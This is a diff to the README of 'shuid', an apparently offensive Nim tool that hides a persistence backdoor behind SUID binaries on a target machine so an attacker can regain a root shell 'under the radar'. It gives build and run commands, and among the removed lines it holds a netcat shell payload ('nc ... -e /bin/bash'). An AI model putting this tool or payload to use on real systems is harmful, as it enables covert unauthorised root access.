@@ -10,7 +10,9 @@ Also a good way to learn Nim and something new
 
 ## Like at home! 🏡 <sup>(persistence)</sup>
 
-* First transfer `shuid` on target
+* Build `shuid` (needs `gcc` & `nim`):<br><pre><code>./build.sh [PERISTENCE_CMD] [RULE_NAME]</code></pre>
+
+* Transfer it on target
 * Run it!<br><pre><code>./shuid</code></pre>
 
 And that's all, you are under the radar. The process to obtain root shell will be outputted 
@@ -18,10 +20,10 @@ And that's all, you are under the radar. The process to obtain root shell will b
 
 ##### More granular
 
-You have other possibilitles to sharpen the exploit. For example you can choose which SUID will hide your "shuid file" and trigger your payload (`-c`). And, of course, you can also custom the payload (`--payload`).
+You have other possibilitles to sharpen the exploit. For example you can choose which SUID will hide your "shuid file" (*aka interpreter*).
 An example:
 ```shell
-./shuid --file "/path/to/suid/file" --payload "nc 127.0.0.2 -e /bin/bash"
+./shuid --file "/path/to/suid/file"
 ```
 
 ## Road to root! 🛣 <sup>(privesc)</sup>
